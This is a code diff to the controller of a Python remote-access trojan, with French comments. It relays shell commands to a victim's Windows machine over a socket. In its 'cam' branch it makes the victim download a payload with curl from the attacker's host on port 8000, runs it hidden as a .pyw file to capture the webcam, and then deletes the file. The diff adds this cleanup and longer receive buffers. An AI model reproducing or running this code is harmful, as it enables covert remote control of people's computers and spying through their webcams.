@@ -39,7 +39,7 @@ if choix=="1":
     fich.write("")
     fich.close()
 
-
+len_msg = 4096
 
 print("démarage de l'ecoute")
 mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -60,31 +60,33 @@ while True:
     if msg=="cam":
         msg="pip install opencv-python"
         mySocket.send(msg.encode("Utf8"))
-        msgServeur = mySocket.recv(1024).decode("Utf8")
+        msgServeur = ""
         while msgServeur!='ex':
-            msgServeur=mySocket.recv(1024).decode("Utf8")
-            print("importation des modules ok")
+            msgServeur=mySocket.recv(len_msg).decode("Utf8")
+        print("importation des modules ok")
         msg="curl http://"+HOST+":8000/cam.py -o C:\\Users\\Public\\Documents\\cam.pyw"
         mySocket.send(msg.encode("Utf8"))
-        while
-        msgServeur = mySocket.recv(1024).decode("Utf8")
+        msgServeur = ""
         while msgServeur!='ex':
-            msgServeur=mySocket.recv(1024).decode("Utf8")
-            print("telechargement du payload ok")
-        msg="start C:\\Users\\Public\\Documents\\cam.pyw"
+            msgServeur=mySocket.recv(len_msg).decode("Utf8")
+        print("telechargement du payload ok")
+        msg="start python C:\\Users\\Public\\Documents\\cam.pyw"
         mySocket.send(msg.encode("Utf8"))
-        msgServeur = mySocket.recv(1024).decode("Utf8")
-        while msgServeur!='ex':
-            msgServeur=mySocket.recv(1024).decode("Utf8")
-            print("lancement du payload ok")
+        print("lancement du payload ok")
         cam.webcam()
+        msg="del C:\\Users\\Public\\Documents\\cam.pyw"
+        mySocket.send(msg.encode("Utf8"))
+        msgServeur = ""
+        while msgServeur!='ex':
+            msgServeur=mySocket.recv(len_msg).decode("Utf8")
+        print('programme nettoyer')
     elif msg=="exit":
         break
     else:
         mySocket.send(msg.encode("Utf8"))
-        msgServeur = mySocket.recv(1024).decode("Utf8")
+        msgServeur = mySocket.recv(len_msg).decode("Utf8")
         while msgServeur!='ex':
-            msgServeur=mySocket.recv(1024).decode("Utf8")
+            msgServeur=mySocket.recv(len_msg).decode("Utf8")
             print(msgServeur)
 
 
